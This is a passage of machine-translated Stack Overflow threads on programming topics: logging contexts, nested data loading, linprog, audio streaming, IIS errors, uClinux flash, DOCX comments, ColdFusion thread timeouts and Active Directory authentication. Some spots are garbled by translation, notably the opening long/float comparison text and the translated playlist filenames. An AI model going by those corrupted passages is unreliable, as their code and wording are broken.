如果您只支持您自己类型的对象之间的隐式转换，我建议您决定应该将哪些“公理”应用于此类转换（例如，确定 if `a==b`、`b==c`和`a==c`都是合法的并且两个其中一个是真的，第三个也必须是真的）然后确定一组最有用的转换，这些转换将使这些公理成立。[我在我的博客http://supercatnet.blogspot.com/2013/09/axioms-of-implicit-type-conversion.html](http://supercatnet.blogspot.com/2013/09/axioms-of-implicit-type-conversion.html)上讨论了四个有用的公理（不幸的是，.NET Framework 包含违反所有四个的转换，而不允许不必进行的转换）。

需要考虑的重要一点是，在大多数情况下，与从不精确类型的转换相比，到不精确类型的隐式转换*带来**的*意外风险要小，但有一个明显的例外：如果将更精确类型的某些东西提供给方法或运算符它具有可以转换为更精确类型和不太精确类型的重载，除非可以使隐式转换成为不可能，否则某种程度的“惊人”行为几乎是不可避免的[例如，如果程序员编写的行为可能令人惊讶，但不是因为隐式转换的精度损失令人惊讶，而是因为至少有六种不同的方式可以比较*`if (someLong == someFloat)``long``float``long`和`float`(*)，以及编译器可能附加到直接比较的*任何*含义都会让那些期待其他东西的人感到惊讶。我知道避免这种惊讶的唯一解决方案是提供重载以明确涵盖所有模棱两可的情况并用`[Obsolete()]`标签标记它们。这样做可能会有些尴尬，但会提供能够满足所有四个公理的实质性优势。*

 *(*) A programmer might plausibly be intending to test whether the long was equal to the value of the float rounded to nearest, truncated toward zero, or floored toward negative infinity; alternatively, the programmer might be wanting to test whether the `float` was the one that represents the `long`, whether the `float` and `long` have the same nominal value, or whether the `float` and `long` would both convert to the same `double`.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-23T22:01:02.867

导致我提出这个问题的边缘案例违反了第二个问题。也就是说，我有一个 Lazy<T> 类（不是每个人吗？）并开始思考我是否不应该提供到 T 的隐式转换。我的直觉是说是的，当前版本是，但我不是太当然。

# java - 记录共享和映射的诊断上下文

> ID：390115
> 
> 赞同：3
> 
> 时间：2008-12-23T21:29:46.660
> 
> 标签：java, .net, logging, apache-commons

据我所知，其他人做了什么来解决 Commons Logging 项目（对于 .NET 和 Java）不支持映射或嵌套诊断上下文这一事实？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-28T10:40:04.297

**执行摘要：**

我们选择直接使用实现者日志框架（在我们的例子中是 log4j）。

**长答案：**

您是否需要一个抽象的日志框架来满足您的要求？它们非常适合希望与最终所在的任何主机环境一起使用的库，但是如果您正在编写应用程序，您可以在许多情况下直接使用实现日志框架（即通常没有任何理由为什么日志实现者应该在应用程序的生命周期中改变）。

我们选择直接使用实现者日志框架（在我们的例子中是 log4j）。Commons-Logging 在类路径中可用，但它只是为了依赖它的库而存在。在我们的案例中，这是一个简单的选择，因为我工作的公司多年来一直将 log4j 作为强制性标准，而且不太可能改变，但即使这不太明显，也可以归结为一些成本/收益分析.

*   NDC 和其他专业功能对我有什么好处？
*   必须更改日志记录实施者的机会是多少，如果必须这样做，成本是多少？

有可能：

*   我是否必须在同时部署中支持不同的日志记录实现者？

在我们的例子中，如果我们需要更改日志记录实现者，我们将需要进行一些重构，但是对于 org.apache.log4j 包中的所有内容，这既不是困难也不是非常冒险的重构¹。log4e Eclipes 插件会很高兴地自动转换实际的日志记录语句；NDC 对象可能是一个问题，因为并非所有日志框架都支持这样的事情。您可以考虑将 NDC.enter() 和 NDC.leave() 方法隐藏在您自己控制的实用程序类中，我们没有打扰。

* * *

¹）著名的遗言

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-28T13:36:17.813

这不是您问题的直接答案，但是您是否可以选择使用 Commons Logging 以外的其他东西？如果您愿意，SLF4J（Simple Logging Facade - [http://www.slf4j.org/](http://www.slf4j.org/)）是另一个似乎支持映射诊断上下文的日志抽象 API。

我应该提到我没有亲自使用它，但一直在考虑在我的下一个主要项目中使用它，因为它们声称比 Commons Logging 好得多。许多较新的主要开源项目似乎也在使用它（Hibernate、Spring Modules、几个 Apache 项目）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-11-05T11:58:11.193

为了完整起见，我最终编写了自己的非常简单的通用接口：

```
public interface IDiagnosticContextHandler
{
    void Set(string name, string value);
} 
```

然后实现了一个 Log4Net 特定版本：

```
public class Log4NetDiagnosticContextHandler : IDiagnosticContextHandler
{
    private readonly Assembly assembly;

    private readonly Type mdcType;

    public Log4NetDiagnosticContextHandler()
    {
        this.assembly = Assembly.Load("log4net");
        this.mdcType = this.assembly.GetType("log4net.MDC", true);
    }

    public void Set(string name, string value)
    {
        this.mdcType.InvokeMember("Set", BindingFlags.InvokeMethod, null, null, new object[] { name, value });
    }
} 
```

然后我使用了一个 IoC 容器（Spring.Net）来引入正确的实现。如果以后需要不同的日志框架，那么编写该接口的不同实现来更改 IoC 配置将是一件简单的事情。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2010-09-20T14:25:37.440

与原始问题和最新（已接受）答案相比，这已经晚了，但我会发布它以供未来的搜索者使用。

根据[Common.Logging (NET)](http://netcommon.sourceforge.net/)网站，下一个版本（当前版本是 2.0）应该支持这个东西。但是，尚不清楚计划何时发布此版本。2.0 于 2009 年 4 月发布。该网站称下一个版本计划在“六月”发布。没有提到年份。2009 年 6 月和 2010 年 6 月来了又去。

话虽如此，至少 log4net/NLog “上下文”抽象的实现存在于 Castle 项目的 git 源代码存储库中。[从这里](http://github.com/castleproject/Castle.Core/tree/master/src/Castle.Services.Logging.log4netIntegration/)开始，查看 ExtendedLog4netLogger、GlobalContextProperties、ThreadContextProperties、ThreadContextStack 和 ThreadContextStacks，了解 Castle 如何公开 NDC 和 MDC。Castle for NLog 中也有类似的实现。

如果 Common.Logging for NET 要实现类似的抽象，您将能够通过从 LogManager 返回的记录器实例设置上下文值，如下所示：

```
ILog logger = LogManager.GetCurrentClassLogger();
logger.ThreadContextProperties["EventID"] = 123;
logger.GlobalContextPropeties["USER"] = GetUser(); 
```

除此之外，如果您有一个要为所有日志消息设置的特定上下文（例如从您在代码中传递的您自己的上下文），您可以编写自己的 log4net 和/或 NLog 抽象以插入 Common .Logging 以自动填充该信息。例如，假设您的应用程序具有传递的“上下文”，有助于跟踪给定“事务”的信息。此外，为简单起见，假设您可以通过“MyContext”之类的静态类访问它。

您的 WriteInternal（当您编写记录器抽象以插入 Common.Logging 时实现的内容）可能看起来像这样（这是针对 NLog。log4net 可能略有不同）：

```
protected override void WriteInternal(CommonLoggingLogLevel logLevel, object message, Exception exception)
{
  LogLevelNLog level = GetLevel(logLevel);
  LogEventInfo logEvent = new LogEventInfo(level, _logger.Name, null, "{0}", new object[] { message }, exception);

  //Access these context values for output formatting using the event-context:item token
  logEvent.Context["ActivityID"] = MyContext.ActivityID;
  logEvent.Context["SessionID"] = MyContext.SessionID;
  logEvent.Context["TransactionStartTime"] = MyContext.TransactionStartTime;

  //Note that you can also set NDC and/or MDC here:
  NLog.MDC.Set("SoftwareVersion", MyContext.Version.ToString());
  _logger.Log(declaringType, logEvent);
} 
```

If you (or someone else) is using Common.Logging (NET) needs log4net/NLog context properties exposed now, you could do something similar to what Castle has done to expose them through the logging abstraction interface. If you want to set the context automatically with information that you can get from inside the logging call, you could do something similar to what I propose above.

# .net - 从数据库填充嵌套集合

> ID：390118
> 
> 赞同：0
> 
> 时间：2008-12-23T21:30:10.557
> 
> 标签：.net, vb.net

我有以下 3 节课

```
Book
Product
SpecialOptions 
```

有很多书，每本书有很多产品。同样，在产品中也有许多 SpecialOptions。这三个类中的每一个都有其他属性，因此每个类都有以下接口

```
Public Interface IBook
   Private ProductList() as collection (of Products)
   Private Somethingelse() as String
End Interface

Public Interface IProduct
   Private SpecialOptionsList() as collection (of SpecialOptions)
   Private Somethingelse() as String
End Interface

Public Interface ISpecialOptions
   Private SpecialOptionsProperty() as String
End Interface 
```

我想创建一个书籍集合，其中包含每个产品，并且当我从数据库中提取数据时，在每个产品下我想要关联的 SpecialOptions。我无法决定哪种方法是最好的方法。

我有两种方法。我要么自上而下，要么自下而上。意思是，我从一本书开始，然后填写产品信息，然后为每个产品填写详细信息。或者我可以先获取详细信息，然后将它们添加到适当的产品中，然后再将产品添加到书籍中。这些都不是很吸引人。

另外，因为我在校对时建议自己，这是我需要捕捉实际关系的结构，所以用不同的结构重新定义问题是行不通的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-23T22:00:25.770

你说

> ...从一本书开始，然后填写产品信息，然后为每个产品填写详细信息...

我会从这本书开始，然后深入研究。这将允许您仅过滤必要的信息。

我希望这能回答你的问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-23T23:58:47.887

有几种方法可以解决这个问题：

加载所有书籍，然后在创建每个 Book 对象时加载所有 Products，然后在创建每个 Product 对象时加载特殊选项。这将导致对数据库的大量查询，但很简单，并使 DB Sprocs 保持简单。伪代码：

```
foreach bookR in GetBooks
    Add a new book to the book collection
    foreach product in GetProductByBook
        Add a new product to the book's product collection
        foreach option in GetOptionByProduct
            Add a new option to the product option collection 
```

* * *

在一个 Sproc 中加载所有书籍、书籍的所有产品和产品的所有选项，返回 3 个结果集。然后首先创建您的所有书籍，然后通过在您的书籍收藏中找到正确的书籍并将其添加到那里来创建您的产品。您的产品也一样。伪代码：

```
foreach bookR in GetResultSet1
    Add a new book to the book collection
foreach productR in GetResultSet2
    Find the correct book in book collection
    Add a new product to the book's product collection
foreach option in GetResultSet3
    Find the correct book in the book collection
    Find the correct product in the book's product collection
    Add a new option to the product option collection 
```

* * *

带回一个结果集中的所有数据（LINQ-to-Sql 就是这样做的）。将所有三个表连接在一起并带回一个结果集。遍历每一行，检查是否存在与该行匹配的书（如果不创建它），然后检查该书上的产品是否存在（如果不创建它）。伪代码：

```
results = GetResultSet
foreach result in results
    get the book for matching result book id
    if the book does not exist, create it from result
    get the product on the book for the matching result product id
    if the product does not exist, create it from result
    etc 
```

# matlab - matlabs linprog 太慢了

> ID：390126
> 
> 赞同：3
> 
> 时间：2008-12-23T21:33:48.007
> 
> 标签：matlab, mathematical-optimization, linear-programming

我正在开发一个需要大大提高速度的 matlab 应用程序。我正在使用 linprog 来求解一个 2 约束线性程序，该程序有大约 10,000 个以零和一为界的变量。Linprog 对我的应用程序来说非常慢。有什么办法可以重新制定以提高速度吗？或者您是否知道一些有用的与 matlab 兼容的共享软件（我的预算很紧）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-17T13:14:25.563

如果您不介意不在 matlab 中但使用 MEX 接口的实现，glpk 和 glpkmex 可能会有所帮助

[http://glpkmex.sourceforge.net/](http://glpkmex.sourceforge.net/)

或者，lpsolve 也可以提供帮助，但它不如 glpk 库解决大规模问题： [http ://web.mit.edu/lpsolve/doc/MATLAB.htm](http://web.mit.edu/lpsolve/doc/MATLAB.htm)

如果您能掌握它，IBM ILOG CPLEX 实际上是处理大规模问题的最佳解决方案之一。matlab有一个接口（http://www-01.ibm.com/software/integration/optimization/cplex-optimizer/connectors/），如果没有license可以尝试获取扩展试用版.

在特殊情况下，通过查看目标函数中的系数并根据您的约束条件确定哪个约束条件将处于活动状态，可以显着简化您的问题。假设您正在最小化目标函数，则不参与主动约束的变量可以设置为最小值或最大值（根据您的描述为 0 或 1），具体取决于它们在目标函数中的系数是正还是负。如果你正在做最大化然后做相反的事情。这减少了变量的数量 =)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2010-06-24T09:01:31.400

对我来说，这听起来像是一个带有框约束（可能称为绑定约束）的线性程序。您是否正确设置了这些框约束？有关详细信息，请参阅[参考资料](http://www.mathworks.com/access/helpdesk/help/toolbox/optim/ug/linprog.html)。

# macos - 如何通过互联网流式传输半实时音频

> ID：390127
> 
> 赞同：2
> 
> 时间：2008-12-23T21:33:51.020
> 
> 标签：macos, audio, audio-streaming

我想写Skype之类的东西，即我在一台计算机上有一个恒定的音频流，然后以适合潜在互联网连接的格式*重新压缩它，在另一端接收并播放它。*

我们还假设互联网连接相当现代和快速，即 DSL 或类似的，没有通过电话等的慢速连接。所涉及的计算机也将相当现代（2GHz 或更高的双核 Intel CPU）。

我知道如何处理机器上的音频。我不知道如何以有效的方式传输音频。

挑战是：

1.  我想获得良好的音频质量。

2.  应无丢包地接收流。然而，接收流可能会有一点延迟（第二个延迟是可以接受的）。我想传输软件可以首先确定平均（和最大）延迟，然后启动流并告诉接收器在开始播放音频之前等待最大延迟。这样，如果延迟没有变得更高，整个流将可以在另一侧播放而不会出现卡顿或掉线。

3.  如果由于意外的 IP 延迟或阻塞，流*确实*被切断了，我希望能够注意到这一点，以便我可以采取行动（例如中止流）并最终开始新的传输。

如果我想使用现成的软件进行压缩和传输，我有什么选择？我真的没有打算编写自己的音频压缩引擎。OTOH，我计划在垂直市场上销售该解决方案，这意味着我可以负担每份几美元的许可费，但不是 100 美元。

我想最简单的解决方案是只打开一个 TCP 流，来回发送几个数据包以确定它们的运行时间（甚至为此使用 UDP），然后使用结果作为我的最大延迟值的指南，然后简单地以原始形式（未压缩的 16 位立体声）触发音频数据，以及通过 TCP 连接的计时码。接收器读取数据并以预定延迟播放。这可能只适用于我期望的快速连接类型。

我只是想知道是否有更好的解决方案来实现这一目标，具有更好的性能（更低的延迟）和更少的数据（压缩）。

顺便说一句，我首先尝试在 OS X 上实现它，但如果证明成功，我也可能想在 Windows 上实现它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-23T21:42:03.890

[VLC](http://www.videolan.org/vlc/)支持各种类型的音视频转码。可能是您想要[查看的](http://wiki.videolan.org/Documentation:Streaming_HowTo)内容。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-23T22:46:49.217

要通过 Internet 传输音频，您可能应该考虑使用 RTP。它用于 SIP、H.323 和许多其他将其用于流式传输音频内容。您甚至可能只想看看使用 SIP 库。它已经拥有你想要的很多东西。 如果你有一个好的编解码器和足够的带宽，[SIP可以有相当好的质量。](http://en.wikipedia.org/wiki/Session_Initiation_Protocol)

*   [https://www.rfc-editor.org/rfc/rfc3550](https://www.rfc-editor.org/rfc/rfc3550)
*   [http://en.wikipedia.org/wiki/Real-time_Transport_Protocol](http://en.wikipedia.org/wiki/Real-time_Transport_Protocol)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2011-07-18T09:12:20.423

我知道线程有点老了，但是，我想与您分享的一个见解是：由于您需要延迟，您不能为此使用 TCP 来尝试执行此操作-您说 1 秒是可以接受，因此我认为超过 1 秒不是。

您使用 TCP 的延迟不是通过 PING 来确定的。TCP 的问题在于，当您连接并接受一定的延迟时，连接的任何问题都会缩小 TCP 窗口，所有接收到的数据都将被丢弃，底层协议将不得不处理它。此时，您将失去 1 秒的实时优势，流将被丢弃。

TCP 适用于可以接受较大延迟（例如 10 秒或更多）的情况，这将允许您在重新建立连接之前始终有足够的数据来吃和播放。

如果我在你的鞋子里，我会尝试以下方法：

*   UDP传输
*   一些低延迟编码 - 例如 AAC-LD，但 mp3 也可以
*   在 UDP 上设置了一些数学开销，因此如果丢失一个数据包，音频流可以恢复。

顺便说一句，mp3 的帧长 40 毫秒。使用一些“魔法”，您可以掩盖一些丢帧。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2011-08-18T14:40:14.087

ShoutCAST + SAM 广播公司或 Winamp。会很容易地做到这一点。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2016-02-24T08:58:17.687

如果您希望使用 icecast2 创建自己的网络广播电台，您可以：

*   在你的 VPS 上安装 icecast

```
    #sudo apt-get install icecast

```

*   在你的 VPS 上安装 ezstream

```
    #sudo apt-get install ezstream

```

*   使用您的文件创建播放列表文件

playlist.m3u（您可以阅读更多形式的[维基百科](https://en.wikipedia.org/wiki/M3U)）

```
    #EXTM3U

    #EXTINF:123，示例艺术家 - 示例标题
    示例.mp3

    #EXTINF:321,示例艺术家 - 示例标题
    例子.ogg

```

*   创建 ezstream 配置文件 xml

配置文件

```
<ezstream>
    <url>http://localhost:8000/stream</url>
    <!--
      If a different user name than "source" should be used, set it in
      <sourceuser/>:
     -->
    <!-- <sourceuser>mr_stream</sourceuser> -->
    <sourcepassword>hackme</sourcepassword>
    <format>MP3</format>
    <filename>playlist.m3u</filename>
    <stream_once>1</stream_once>
    <svrinfoname>My Stream</svrinfoname>
    <svrinfourl>http://www.oddsock.org</svrinfourl>
    <svrinfogenre>RockNRoll</svrinfogenre>
    <svrinfodescription>This is a stream description</svrinfodescription>
    <svrinfobitrate>128</svrinfobitrate>
    <svrinfochannels>2</svrinfochannels>
    <svrinfosamplerate>44100</svrinfosamplerate>
    <svrinfopublic>0</svrinfopublic>
</ezstream> 
```

或者你可以试试这个：[nodejs application](http://dj.stage9.ro)

# visual-studio-2008 - 带有子目录的 IIS 网站部署对子目录中的页面抛出 404 错误

> ID：390132
> 
> 赞同：3
> 
> 时间：2008-12-23T21:34:26.493
> 
> 标签：visual-studio-2008, deployment, iis-6, http-status-code-404

在 IIS 6 中，我正在尝试从 Visual Studio 2008 部署一个网站项目。该站点有一个子文件夹，其中包含一些 aspx 页面。当我将项目部署到服务器并导航到该站点时，除了子文件夹中存在的页面之外，一切正常，它们会引发 404 错误。

在 IIS 中，我可以导航子文件夹并查看那里的页面，但是当我右键单击其中一个文件并选择“浏览”时，也会引发 404。

仅供参考...当我从 VS 发布站点时，我选中了“允许此预编译站点可更新”的框。我试过取消选中该框，但它给了我相同的结果。

此外，在本地运行或在调试模式下运行不会产生此结果，我可以很好地导航到子文件夹中的页面。

编辑：深入研究，它在 IIS 日志中给了我一个 404.2 (404 2 1260) 错误，这意味着[锁定策略阻止了这个请求](http://www.microsoft.com/technet/prodtechnol/WindowsServer2003/Library/IIS/0f4ac79a-dc2b-4a5f-89c1-d57266aa6ffe.mspx?mfr=true)。任何想法这意味着什么以及我如何解决它？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-12-23T21:40:42.800

如果它是 IIS 不知道 mime 类型的文件扩展名，则可能导致 404。

尝试在 IIS 日志（网站属性->启用日志记录->浏览）中查找错误。IIS 应该将它们称为 404.1 或 404.2 或类似的名称，这将为您提供有关特定错误的更多信息。

编辑：这已经很晚了，但是那个错误让我想知道你是否需要进入 IIS 管理-> Web 服务扩展（网站下的文件夹）并允许 ASP.NET。这在 Win2003 中默认为禁用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-23T21:40:08.417

检查子文件夹中的页面是否引用了您可能忘记与站点的其余内容一起部署的页面或用户控件。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-06-26T06:57:21.330

检查 IIS 是否创建了该目录的虚拟目录并将其删除。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2008-12-23T22:17:42.927

试试这个：打开服务器上的 IIS 管理器，右键单击站点文件夹（不是子文件夹），然后单击“属性”。在“虚拟目录”选项卡上，在“应用程序设置”中查找“创建”按钮。如果它在那里，请确保权限设置设置为“仅限脚本”，然后单击“创建”按钮。如果按钮显示“删除”，请尝试将权限更改为“脚本和可执行文件”。如果它不起作用，您可以随时将其更改回来。

# arm - 执行预加载在闪存 NOR 中的代码

> ID：390133
> 
> 赞同：4
> 
> 时间：2008-12-23T21:35:21.280
> 
> 标签：arm, embedded, flash-memory, uclinux

我正在构建一个在 NXP LPC2478 上运行的 uClinux 系统。该芯片具有 512k 板载快速闪存，可以直接执行代码。我想从常规的外部 SDRAM 加载和运行用户应用程序。但是我有一个特殊的图形库，我想预先加载它以在板载闪存之外执行。

有没有办法编译图形库以在内存中的固定位置（闪存）运行，然后编译/链接使用它的应用程序以将其对该库的所有引用固定到闪存中的适当位置？

如果我必须编写一个手动进行修复的自定义应用程序加载器，我会这样做。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-24T08:23:27.527

我假设您使用的是 GCC。此外，我相信您将 uCLinux、图形库和您的应用程序连接在一个阶段以生成可执行文件。所有组件的链接由链接描述文件（ld 文件）控制。要做你想做的事，你需要编辑 ld 文件并在启动代码中进行正确的初始化。

在链接描述文件中，您应该将数据部分放在外部 RAM 中。然后为图形库创建一个特殊的部分并将其放入闪存中。创建节时，您可以指示它将包含哪些目标文件。在您的启动代码中，您需要将数据部分从闪存复制到 RAM。链接器将负责将 RAM 中的应用程序与闪存中的图形库链接起来。

事情通常是这样完成的。根据您对工具链和库的要求，可能涉及更多步骤。

# c# - 在 Docx 文件中插入注释*围绕*运行中的文本

> ID：390135
> 
> 赞同：2
> 
> 时间：2008-12-23T21:36:01.887
> 
> 标签：c#, openxml, docx, wordml

如何在文本运行中搜索特定文本（在 Docx 中使用 OpenXML SDK 2.0），一旦找到它，如何在“搜索文本”周围插入注释。“搜索文本”可以是现有运行的子字符串。示例中的所有示例都在第一段周围插入注释或类似的简单内容......不是我想要的。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-02-14T21:08:48.197

您必须将其分解为单独的运行。尝试使用 DocumentReflector（它甚至生成 C# 代码）来查看使用 word 创建的文档。结构应该看起来像这样（简化）：

```
<paragraph>
  <run>...</run>
  <commentRangeStart />
  <run>search text</run>
  <commentRangeEnd />
  <run>...</run>
</paragraph> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-12-16T22:34:34.707

对于可能仍在寻找答案的人：

[这](http://msdn.microsoft.com/en-us/library/office/cc850832(v=office.15).aspx)是代码：

```
private void AddComment( Paragraph paragraph, string text )
        {
            string commentId = GetNextCommentId();
            Comment comment = new Comment() { Id= commentId, Date = DateTime.Now };
            Paragraph commentPara = new Paragraph( new Run( new Text( GetCommentsString( text ) ) ) { RunProperties = new RunProperties( new RunStyle() { Val = "CommentReference" } ) } );
            commentPara.ParagraphProperties = new ParagraphProperties( new ParagraphStyleId() { Val = "CommentText" } );
            comment.AppendChild( commentPara );
            _comments.AppendChild( comment );//Comments object
            _comments.Save();

            paragraph.InsertBefore( new CommentRangeStart() { Id = commentId }, paragraph.GetFirstChild<Run>() );
            var commentEnd = paragraph.InsertAfter( new CommentRangeEnd() { Id = commentId }, paragraph.Elements<Run>().Last() );
            paragraph.InsertAfter( new Run( new CommentReference() { Id = commentId } ), commentEnd );
        } 
```

# multithreading - 增加 CFML 中线程的请求超时

> ID：390148
> 
> 赞同：1
> 
> 时间：2008-12-23T21:42:14.277
> 
> 标签：multithreading, coldfusion, timeout

我有一个 Web 应用程序，它在 Windows/IIS 服务器上使用 ColdFusion 8 批量生成数百个 PDF。

该过程在我的开发和登台服务器上运行良好，但当然客户端很便宜并且只为共享主机付费，这不如我的开发/登台盒快。因此，PDF 生成线程超时。

流程是这样的：

1.  运行页面以生成 PDF。
2.  运行查询以确定需要生成哪些 PDF，然后循环为需要生成的每个 PDF 触发应用程序范围的 UDF 调用。
3.  该 UDF 查找给定项目的信息，然后为 PDF 生成创建一个线程，以防止生成减慢页面速度。
4.  该线程仅使用 CFDocument 创建 PDF 并将其保存到磁盘，然后终止。

线程不会重新加入，并且没有任何东西在等待它们中的任何一个完成。进行 UDF 调用的页面在几毫秒内完成；是线程本身超时。

这是 UDF（和线程创建）的代码：

```
<cffunction name="genTearSheet" output="false" returntype="void">
    <cfargument name="partId" type="numeric" required="true"/>
    <!--- saveLocation can be a relative or absolute path --->
    <cfargument name="saveLocation" type="string" required="true"/>
    <cfargument name="overwrite" type="boolean" required="false" default="true" />
    <cfset var local = structNew() />

    <!--- fix save location if we need to --->
    <cfif left(arguments.saveLocation, 1) eq "/">
        <cfset arguments.saveLocation = expandPath(arguments.saveLocation) />
    </cfif>

    <!--- get part info --->
    <cfif structKeyExists(application, "partGateway")>
        <cfset local.part = application.partGateway
        .getByAttributesQuery(partId: arguments.partId)/>
    <cfelse>
        <cfset local.part = createObject("component","com.admin.partGateway")
        .init(application.dsn).getByAttributesQuery(partId: arguments.partId)/>
    </cfif>

    <!--- define file name to be saved --->
    <cfif right(arguments.saveLocation, 4) neq ".pdf">
        <cfif right(arguments.saveLocation, 1) neq "/">
            <cfset arguments.saveLocation = arguments.saveLocation & "/" />
        </cfif>
        <cfset arguments.saveLocation = arguments.saveLocation & 
        "ts_#application.udf.sanitizePartNum(local.part.PartNum)#.pdf"/>
    </cfif>

    <!--- generate the new PDF in a thread so that page processing can continue --->
    <cfthread name="thread-genTearSheet-partid-#arguments.partId#" action="run" 
    filename="#arguments.saveLocation#" part="#local.part#" 
    overwrite="#arguments.overwrite#">
        <cfsetting requestTimeOut=240 />
        <cftry>
        <cfoutput>
        <cfdocument format="PDF" marginbottom="0.75" 
        filename="#attributes.fileName#" overwrite="#attributes.overwrite#">
            <cfdocumentitem type="footer">
                <center>
                <font face="Tahoma" color="black" size="7pt">
                pdf footer text here
                </font>
                </center>
            </cfdocumentitem>
            pdf body here
        </cfdocument>
        </cfoutput>
        <cfcatch>
        <cfset application.udf.errorEmail(application.errorEmail,
        "Error in threaded PDF save", cfcatch)/>
        </cfcatch>
        </cftry>
    </cfthread>
</cffunction> 
```

如您所见，我尝试`<cfsetting requestTimeout=240 />`在线程顶部添加一个以尝试使其寿命更长...没有骰子。[当我看到CFThread 标签有一个超时参数](http://cfquickdocs.com/cf8/?getDoc=cfthread#cfthread)时，我也有点兴奋，但后来意识到它只适用于加入线程（action=join）时。

在 ColdFusion Administrator 中更改默认超时不是一个选项，因为这是一个共享主机。

如果有人对如何使这些线程寿命更长有任何想法，我将不胜感激。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-02-23T23:25:43.037

我们在服务器上使用 90 秒的总体超时（在 CF 管理员中设置），但在需要时使用 CFM 文件中的语句覆盖该设置。我们还让服务器记录任何持续 30 秒或更长时间的请求，以便我们知道哪些请求需要优化和/或需要 requesttimeout 覆盖（尽管由于其他原因超时请求很明显，很高兴有一个您的列表C:\ColdFusion8\logs\server.log 中最慢的事务）。

例如，在作为夜间任务运行的 CFM 顶部，我看到：

```
<cfsetting enablecfoutputonly="Yes" showdebugoutput="No" requesttimeout="80000"> 
```

我可以告诉你，它在昨晚运行时花了 34,313 秒才能完成。显然还有改进这个过程的空间，但它在办公日开始前几个小时就完成了。如果在 CFM 文件中未设置该 requesttimeout 参数，则该作业肯定会在 90 秒标记处超时。

在我们有更长的任务覆盖该设置之前，我必须从更高的请求超时开始，并在我们收紧工作时观察失败并重新运行作业。理想情况下，如果拥有良好的硬件、代码和良好的数据库结构，我会继续将我的 CF 管理员超时时间缩短到 CF8 默认的 30 秒。不幸的是，我的数据库结构和代码还没有达到那个水平。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-31T02:22:49.323

我认为没有办法让线程在您无权访问 cf 管理员的共享主机上存活更长时间。我认为 cf 管理员限制在激活时总是会覆盖 cfsetting requesttimeout 值，所以我认为您的双手几乎都在这方面受到束缚。

我的建议是将策略从在当前页面中创建所有 PDF 更改为对需要创建的每个 PDF 发起另一个请求。不优雅的不显示 iframe 可能是最简单的解决方案。您可以简单地为需要生成的每个 PDF 输出一个 iframe，这样它就永远不会遇到超时问题，因为每个单独的 PDF 都应该在主机设置的时间限制内生成。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-09T15:06:35.500

虽然这并不能直接回答我原来增加线程超时的问题，但我已经能够通过改进 PDF 生成时间来使进程正常工作（防止超时）。

根据[livedocs](http://livedocs.adobe.com/coldfusion/8/htmldocs/Tags_d-e_05.html#3765835)，ColdFusion 8`localUrl`在标签中添加了一个属性`CFDocument`，表明图像文件位于同一台物理机器上，应该作为本地文件包含在内，而不是对它们发出 HTTP 请求。

将我的`CFDocument`代码更改为以下代码使进程运行得足够快，以至于线程不会超时。

```
<cfdocument format="PDF" marginbottom="0.75" 
filename="#attributes.fileName#" overwrite="#attributes.overwrite#" localUrl="yes">
    <cfdocumentitem type="footer">
        <center>
        <font face="Tahoma" color="black" size="7pt">
            pdf footer text here
        </font>
        </center>
    </cfdocumentitem>
    pdf body here
    <img src="images/foo/bar.gif"/>
</cfdocument> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-01-10T23:07:11.987

如果有人发现这篇文章并且他们遇到了即使是简单的 pdf 文件（例如`<cfdocument format="pdf">Hello world</cfdocument>`（可忽略的内容，没有图像）也需要花费几分钟来渲染的麻烦），请检查您的

Windows\system32\drivers\etc\hosts

服务器文件并确保它指向自身

```
127.0.0.1 localhost 
```

I had a server functioning normally and then suddenly pdfs were timing out until I set the CF Admin timeout to 5 minutes (?!?!?!). Some update (done by I don't know who, probably some network security admin/monitor person) had modified the above file to some other intranet IP and the DNS server name. I changed it back and pdfs resumed rendering in normal time responses.

# java - 在 Linux 上使用 Java 对 Active Directory 进行身份验证

> ID：390150
> 
> 赞同：76
> 
> 时间：2008-12-23T21:42:37.663
> 
> 标签：java, authentication, active-directory, ldap

我有一个使用 Java 对 Active Directory 进行身份验证的简单任务。只是验证凭据，没有别的。假设我的域是“fun.xyz.tld”，OU 路径未知，用户名/密码是 testu/testp。

我知道有一些 Java 库可以简化这项任务，但我没有成功实现它们。我发现的大多数示例都是针对 LDAP，而不是专门针对 Active Directory。发出 LDAP 请求意味着在其中发送一个 OU 路径，而我没有。此外，发出 LDAP 请求的应用程序应该已经绑定到 Active Directory 才能访问它……不安全，因为凭据必须存储在可发现的某个地方。如果可能的话，我想要一个带有测试凭据的测试绑定——这意味着该帐户是有效的。

最后，如果可能的话，有没有办法使这种身份验证机制加密？我知道 AD 使用 Kerberos，但不确定 Java 的 LDAP 方法是否可以。

有没有人有工作代码的例子？谢谢。

* * *

## 回答 #1

> 赞同：98
> 
> 时间：2009-01-17T18:14:13.943

有 3 种身份验证协议可用于在 Linux 或任何其他平台上执行 Java 和 Active Directory 之间的身份验证（这些协议不仅特定于 HTTP 服务）：

1.  Kerberos - Kerberos 提供单点登录 (SSO) 和委托，但 Web 服务器也需要 SPNEGO 支持才能通过 IE 接受 SSO。

2.  NTLM - NTLM 通过 IE（和其他浏览器，如果配置正确）支持 SSO。

